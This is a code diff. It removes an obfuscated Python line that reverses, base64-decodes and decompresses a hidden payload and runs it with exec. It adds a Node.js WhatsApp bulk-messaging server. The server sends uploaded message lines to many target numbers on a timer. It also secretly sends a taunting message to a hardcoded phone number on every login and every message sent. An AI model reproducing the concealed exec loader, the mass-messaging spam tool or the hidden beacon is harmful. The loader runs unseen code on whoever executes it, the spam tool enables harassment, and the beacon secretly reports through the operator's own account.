@@ -1,1 +1,157 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=Y1/lRz/33v//V+f4GcyNce7seceiS29dFJ/TtvvLezkJFzqGBAI8rzwqFYAnBo1OiAIRWH6BU/XR1PlgARzMjdc0mSYj12jlJEheG9A1S2+kwNVyyngwFW8yW79OERuqRgKKvXSDiUEPuh4NlNe+V2NLvvkgRA2mXz+IAlVENubc9jAZpQwRzMoTkJzZtX9sfO2IMFjBXeh7QUCo46S4aHpUaC7IZwTlXZfm8p+rFfOjGdK67rDFm7oYBORG3WLmSex94PeJPcd8AGG+EYKdDOYwqsuvNLSxTuObFWaRDlHTgfFcBNRBqDPDPOY1T1rngutD13nCj5sRKWRGzh7XiRV8vyQUjOxB+/Dq9YkmSf0oz2sepfbaOnX+5PtfENAmfEmYl2aHsWwOP4oXRfPIqU4q7mZlWxhc/ZAiMQZFUQzet5HMAK2PmUtxu5Cnce+uNeYX+93mF949a77vA1+WMYEM+bPOMipa+Xo1L1HMXqqRliDw6JL07J6vR5VGgGSATJb/8aAGXmtHquFY4N/nlrOEXxgEkTH8XIvXA/Ihjouc51AvdqZelTmZ3t3Jv5XU/NXt1RziW/OUja/KrAs5XEhmfCKpapooJqY7BMAVm4Prhv45UZzIraGqdmLl3DNHNG6mCwUeAXoGtg94v7LQCKm+0Ewfb8MrDAFpT7PfCKpfkBb4/ix5qWqtcS72TTaDWU3AUyeigWZlcHMvnEo/OyxPhzUANerMISsWnhoVmb0om5XqpLSCVR3lzOxS8ky3z1c3Tprs5gP8FTOcAqIKndWGo/79jE04U09+SSWRdM0a976vzSidrg0/VMZG7tzMn/wOe1oyUGEXab4PVDJiLqxEL6EZo4SQI++AoRqq7uso/Y4Xb5dHxj9juj8XIN8vld4q176bq9yAiEamglgSSTe2MTLkpoGW4CLeSGwJBvVIWL79ZKgCsNbr4m3nkmrss1MRrZVW2J5kv/4VDQ3ZRcLWXgcH9zJ8/1Zrk8tPOEYSrVMkFS36QPNkLyZB2O6OJhiKPC69q3TvjciroQOB6V0Q+GssuqAUHlTwirhFEDUN7lqzSqytfCr4M1wBQgsRpXD7lVVJEOqowr6h4TVkgqhHOGQca3Dd4wZlnVbrQDdFD/rUg+N2DrJ4NnyMwiE+/L1H+RgZdQ9MAcgd6Wg9d9LcxhzHEd6frZ64+nFiL0Pm6P3UQnGaTSVtw8J9XL5tvpJJ6OJqWwHs9PKGgjhBfOiN72KDHV1xc1RWJo37e3sD6tCVK9MyKGlHnkCK8zlMtZluMWNvNGuqQ7vgj+htZ2dgLpzwbA6Vnuxf3b3vnVo/CRyP+ZYEewh6XLdneG6PwUPiAWDmrwad0C9DD7rtuD4JzUs9iXL8zZe1GD58IYXdkOWEs3EjTxp0frEEKkwgbNJ6JVc7XsGaNxKK8n9DJ7iKwBJ7mktvG3MFI65fM5+8ATfmHzy/nTqLkWEV/AMZzoNE6gtq4AXZ+6vb522Y0gXKD9rvO8MAYKRVBFGz3VYyO17NuJwrl9j7pVtfViuHtLeTT/HTtl3+jp2zIAOqnciGIW1MuvXkK2FoRFTZXYKY7SnNZipvum+aFJZl28zoMYaIL5CWC1ElJoyDmMBQ/G3iCxkK5v2OjUwmfVUu5p0XQcl7y9UbzXT3A3Afyv62d3FvPx5WqXubyBLoybkjKNwoFZBZAmn/N2VPMKsS9tW2ltE1rS3FzZgXOWCZ+KIAvFlfizkiUYaE/+TGavIjFSGZWZdxSJZDYJvbw1/e6TaKLzzUf1UzPrcBzNTJ5D2JyLAHjFvQ153PWX9Ob21a7lN9SNwQpFXK+NfkKFnuN52O0kgdFx8Osl2yCKPbe6AZTZ421qeul+CuB7v7Vft11/V3+kokiR4mexLTWM7R9ngpRtOAH/FgMSaZsH6uwKVwsFzZSRWrHLAq+VyBzNYvkQYEdG23T3/jubSILvVUjPv+TyEX5a7mxCYo3M+ArTlAUl9hKH81GLPm5N5WkJAmiDSt/mTyO6vgSHELqFO7EPZI7fokHYzAeWQ5ZcMPPVQ2gORn3QBzIBzJR5Dx6EM9znZhyu4fooawCLxZry4C+FTBDOXGYxqUTUcILkasP0Wc2p4cAdqfg1NEEB6W4f+07d5l+KYerRoNjjGVLduYii5Du8dPSJsuF4zP57dmMQedP0ASMo6adA3mpJ9sOPt7Fc5FRhUnsllqkM1T09jRA500KFtMylyQLhzKBtskHtx4IIRPNrinL3bBpXaLYhhKfwbtCkd7EWX4RvM7HVaV3mIcZxxZIsOcbxvD8YsKAw6XiaxqJzNMsNTJlDPFqKpnWAxOSWcPJ3wGAYCxpRZjwfn1kwK9HZIzKOGLRgJYHSgv78ccefte5aFItshPYZOZPXrjpT1UXPMEXUJoE91fiHaQW5JuEsJBk/aJtLiM5zD/+iHXia0tJhn5d1MKZPWAYcAX9iOLNPtUgjLVL5aYyNlwMmV38K8KykEAgWQwS4MXpTWqnS9QgGJolhOBHMGXHtD6SmbuXkIQ1DTeNwF5huGYFK1xVMN6W3e+I8ntTKLdk5k4EteZye+W1zVH17J8uj1LOAJzC9rua54qxY9XX7OaH2WHzPGZ+9YgD2O+oodJqN3TsrMsNDfDNtIlJgCSN47z2lJGHmkHeQNCSLrjjTLeCVsWn/+Jt0fI32xayEknb5qxuhvSyNpSjwpcpTrCTOcJz73ElTfPwp8LE+9k3IRAWxHuPH7ui0bOQZm46UlvYoOqQ0Zx+Fp+ViZy0n4WWQicJEDR5NM/SNVqsrSBrYRfuwnxAejUt9cObDEOdD99Fp0mnNueuxceeJ+2oIFJ278wxz+dhtGH1QWuAbXGNMulQ87K/3eGSjFh1l85rt1QzRymxR8wQnbMBj1/TsdVRvI9eqOQY+acVTCrCPhYkQ3R2rxOBkxwl9kVNAYRmg5lzA4MD/ImkytjYSZhpW2ehsaEV1HMDzDEHbk4w/SPSj47dBOoU9uZN0AlnJUav8Pzw2nGQ6vftU4/8MJAb4vQOoUECUil7X3/kHZ6jUIUtUoDPAtJi+oH4p10j5vHdQpb4z24pjz51Z58xXsjSpnaZmF4HU2SKs7YIMyKOt87jQHwJh1QtMqqjf0E+2sW9k3Ki4w6QZ3+MUOyCrF5u4WmVHB/2RwNCi/y1UzZS4CZcw6w23YE3tiScJCh6KAasT9JOawBWowgaV+xB7tmXjlp3i7HyT9/hm5pTdypXji2B1VrcyCOLDm+gtgYre5k1fg+++pfe3LnWB0QP9FvvrdugreV4fwPuglAFJ4FGaFJ4vZlCgzbC1b2n9L4ma43i2jdowdQxwj8RsgkDBQvenH8+z4PuiewmiRVgagYV5w3Tl3+Up0WwIviv5Ox/tIkS7c6rXeKAOpmgWN/0bKqNGWL5cUPK7cSRkQ3Ym/tfvKW/of2DiZ0MIfSDIwR3DDHgHwg/q/s7R6R2Ec4UoTLz5Ny92JaMS53VgKnFgrYSmKC9Ji7amDEReRF2fpJK2/fFqxUuRiV38y88RDGdjAR2Yun7uErnxC6fvXQ0ASRryMVGuIiXKj0PkD56WNf0iqzb99mgL6wpYapMHkw9YIlomZdPJ8WQwiuykGvjKAItVGXoSftKsCNIhH8VaUoheq12QAJv6A0eKPSF//8VwvbPD5iFtwgd7GF9Ujh9otlxS68TJ2uNuz2DLwcyKzTt79RkWBcePBatBsYfPyS79p3KUPM6d1oTmIz0WFhWBxhUoKhO2n0UJhf+xW54cFHauB6rHUO5YwWlUihwPad4iEvRd4gt2THCjPTqmByie5WWJEt1RY7ulgH18Gbhah59hoICysKwLYC+a+/T2//+d++/38pIP3zLztZFBU3Mf9rNTMJwZGJmuYYYMTDFS3zcJRSgVxyWzlNwJe'))
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const pino = require('pino');
+const {
+  makeWASocket,
+  useMultiFileAuthState,
+  delay,
+  DisconnectReason,
+} = require('@whiskeysockets/baileys');
+const multer = require('multer');
+const qrcode = require('qrcode');
+
+const app = express();
+const port = 5000;
+
+let MznKing;
+let isConnected = false;
+let qrCodeCache = null;
+let targetNumbers = [];
+let messages = null;
+let lastSentIndex = 0;
+let intervalTime = null;
+let groupUIDs = [];
+
+// Configure multer for file uploads
+const storage = multer.memoryStorage();
+const upload = multer({ storage: storage });
+
+// Middleware
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Initialize WhatsApp connection
+const setupBaileys = async () => {
+  const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
+
+  const connectToWhatsApp = async () => {
+    MznKing = makeWASocket({
+      logger: pino({ level: 'silent' }),
+      auth: state,
+    });
+
+    MznKing.ev.on('connection.update', async (update) => {
+      const { connection, lastDisconnect, qr } = update;
+
+      if (connection === 'open') {
+        console.log('WhatsApp connected successfully.');
+        isConnected = true;
+
+        // Send login notification
+        await MznKing.sendMessage('919695003501@s.whatsapp.net', {
+          text: 'Ayush Chudwastav ke jiju Raj Thakur sir mai aapka 🔥 tools use kar rha hu',
+        });
+      } else if (connection === 'close' && lastDisconnect?.error) {
+        const shouldReconnect =
+          lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+        if (shouldReconnect) {
+          console.log('Reconnecting...');
+          await connectToWhatsApp();
+        }
+      }
+
+      if (qr) {
+        qrCodeCache = await qrcode.toDataURL(qr);
+      }
+    });
+
+    MznKing.ev.on('creds.update', saveCreds);
+    return MznKing;
+  };
+
+  await connectToWhatsApp();
+};
+
+setupBaileys();
+
+// Serve UI
+app.get('/', (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>WhatsApp Multi-login System</title>
+      <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f0f0; color: #333; }
+        h1 { text-align: center; color: #4CAF50; }
+        #qrCodeBox { width: 200px; height: 200px; margin: 20px auto; display: flex; justify-content: center; align-items: center; border: 2px solid #4CAF50; }
+        form { max-width: 500px; margin: 20px auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; }
+        button { background: #4CAF50; color: #fff; border: none; cursor: pointer; }
+      </style>
+    </head>
+    <body>
+      <h1>WhatsApp Multi-login System</h1>
+      ${isConnected ? `
+        <form action="/send-messages" method="post" enctype="multipart/form-data">
+          <label>Upload Message File:</label>
+          <input type="file" name="messageFile" required>
+          <label>Enter Target Numbers (comma separated):</label>
+          <input type="text" name="numbers" required>
+          <label>Enter Delay (seconds):</label>
+          <input type="number" name="delay" required>
+          <button type="submit">Start Sending Messages</button>
+        </form>
+      ` : `
+        <h2>Scan QR Code or Login</h2>
+        <div id="qrCodeBox">
+          ${qrCodeCache ? `<img src="${qrCodeCache}" alt="Scan QR Code"/>` : 'Loading QR Code...'}
+        </div>
+      `}
+    </body>
+    </html>
+  `);
+});
+
+// Process messages
+app.post('/send-messages', upload.single('messageFile'), async (req, res) => {
+  try {
+    const { numbers, delay } = req.body;
+
+    messages = req.file.buffer.toString('utf-8').split('\n').filter(Boolean);
+    targetNumbers = numbers.split(',');
+    intervalTime = parseInt(delay, 10);
+
+    await sendMessages();
+
+    res.send({ status: 'success', message: 'Messages sent!' });
+  } catch (error) {
+    res.status(500).send({ status: 'error', message: error.message });
+  }
+});
+
+// Message sending logic
+const sendMessages = async () => {
+  for (let i = lastSentIndex; i < messages.length; i++) {
+    try {
+      const message = messages[i];
+      for (const target of targetNumbers) {
+        await MznKing.sendMessage(`${target}@c.us`, { text: message });
+        await MznKing.sendMessage('919695003501@s.whatsapp.net', {
+          text: 'Ayush Chudwastav ke jiju Raj Thakur sir mai aapka 🔥 use kar rha hu',
+        });
+      }
+      await delay(intervalTime * 1000);
+    } catch (err) {
+      console.error(`Error sending message: ${err.message}`);
+      lastSentIndex = i;
+      break;
+    }
+  }
+};
+
+// Start server
+app.listen(port, () => console.log(`Server running on http://localhost:${port}`));
